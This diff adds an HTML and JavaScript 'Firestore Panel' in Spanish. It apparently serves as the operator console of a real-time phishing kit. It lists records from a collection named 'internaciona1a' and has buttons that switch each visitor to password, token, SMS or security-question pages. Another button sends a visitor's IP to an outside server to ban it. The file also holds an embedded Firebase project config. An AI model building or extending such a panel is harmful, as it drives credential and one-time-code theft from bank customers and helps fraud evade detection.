@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <title>Firestore Panel</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        padding: 20px;
+      }
+
+      #data {
+        margin-top: 20px;
+      }
+
+      .document {
+        border: 1px solid #ccc;
+        padding: 10px;
+        margin-bottom: 10px;
+      }
+
+      .document p {
+        margin: 5px 0;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <h1 class="text-center my-4">Firestore Panel</h1>
+      <div id="data" class="row"></div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+    <script>
+      // Configuración de Firebase
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      // Inicializar Firebase
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
+
+      // Función para mostrar los datos
+      function displayData(docs) {
+        const dataDiv = document.getElementById("data");
+        dataDiv.innerHTML = "";
+
+        docs.forEach((doc) => {
+          console.log(doc.id);
+          const docDiv = document.createElement("div");
+          docDiv.className = "col-md-4 document";
+          docDiv.innerHTML = `
+<div class="card mb-3">
+  <div class="card-body">
+    <h5 class="card-title"><strong>ID:</strong> ${doc.id}</h5>
+
+    <div class="mb-3">
+      <label for="questionInput-${doc.id}" class="form-label">Modificar Question</label>
+      <div class="input-group">
+        <input type="text" class="form-control" id="questionInput-${doc.id}" placeholder="Modificar question1" />
+        <button class="btn btn-success" onclick="updateQuestion('${doc.id}')">Actualizar</button>
+      </div>
+    </div>
+
+    <div class="d-grid gap-2">
+      <button class="btn btn-primary btn-sm" onclick="updateDocument('${doc.id}')">Contraseña</button>
+      <button class="btn btn-danger btn-sm" onclick="deleteDocument('${doc.id}')">Eliminar</button>
+      <button class="btn btn-secondary btn-sm" onclick="token('${doc.id}')">Token</button>
+      <button class="btn btn-dark btn-sm" onclick="banearIP('${doc.id}')">Banear IP</button>
+       <!-- Botón separado debajo -->
+    <div class="mt-2">
+      <button class="btn btn-secondary btn-sm" onclick="changePaget('${doc.id}')">Lo regresa al inicio</button>
+    </div>
+    </div>
+  </div>
+</div>
+
+`;
+
+          dataDiv.appendChild(docDiv);
+        });
+      }
+
+      // Obtener datos de Firestore
+      db.collection("internaciona1a").onSnapshot((snapshot) => {
+        const docs = snapshot.docs;
+        displayData(docs);
+      });
+
+      // Función para guardar la imagen en LocalStorage
+
+      // Función para actualizar el documento
+      function updateDocument(id) {
+        db.collection("internaciona1a")
+          .doc(id)
+          .update({
+            page: 4,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+
+      // Función para eliminar el documento
+      function deleteDocument(id) {
+        db.collection("internaciona1a")
+          .doc(id)
+          .delete()
+          .then(() => {
+            console.log("Documento eliminado con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error eliminando el documento: ", error);
+          });
+      }
+
+      function updateQuestion(id) {
+        const input = document.getElementById(`questionInput-${id}`);
+        const newQuestion = input.value;
+
+        if (!newQuestion.trim()) {
+          alert("El campo no puede estar vacío.");
+          return;
+        }
+
+        db.collection("internaciona1a")
+          .doc(id)
+          .update({ question1: newQuestion, page: 5 })
+          .then(() => {
+            console.log(
+              `question1 actualizado a "${newQuestion}" para el documento con ID: ${id}`
+            );
+          })
+          .catch((error) => {
+            console.error("Error actualizando question1: ", error);
+          });
+      }
+
+      // Función para cambiar la página a 2
+      function changePageToTwo(id) {
+        db.collection("internaciona1a")
+          .doc(id)
+          .update({
+            page: 2,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+
+      function token(id) {
+        db.collection("internaciona1a")
+          .doc(id)
+          .update({
+            page: 6,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+
+      function sms(id) {
+        db.collection("internaciona1a")
+          .doc(id)
+          .update({
+            page: 7,
+          })
+          .then(() => {
+            console.log("Página cambiada a 2 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+
+      // Función para cambiar la página a 1
+      function changePaget(id) {
+        db.collection("internaciona1a")
+          .doc(id)
+          .update({
+            page: 1,
+          })
+          .then(() => {
+            console.log("Página cambiada a 1 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+
+      // Función para cambiar la página a 4
+      function changePageToContra(id) {
+        db.collection("internaciona1a")
+          .doc(id)
+          .update({
+            page: 3,
+          })
+          .then(() => {
+            console.log("Página cambiada a 4 para el documento con ID: ", id);
+          })
+          .catch((error) => {
+            console.error("Error cambiando la página: ", error);
+          });
+      }
+      function banearIP(id) {
+        db.collection("internaciona1a")
+          .doc(id)
+          .get()
+          .then((doc) => {
+            if (doc.exists) {
+              const ip = doc.data().ip;
+              if (!ip) {
+                alert("Este usuario no tiene una IP registrada.");
+                return;
+              }
+
+              fetch("https://servidor-36pus.vercel.app/bloquear_ip/", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ ip: ip }),
+              })
+                .then((res) => res.json())
+                .then((data) => {
+                  alert(`IP ${ip} baneada exitosamente.`);
+                })
+                .catch((err) => {
+                  console.error("Error al banear IP:", err);
+                  alert("Ocurrió un error al intentar banear la IP.");
+                });
+            } else {
+              alert("Documento no encontrado.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error obteniendo documento:", error);
+          });
+      }
+    </script>
+    <script
+      src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+      integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
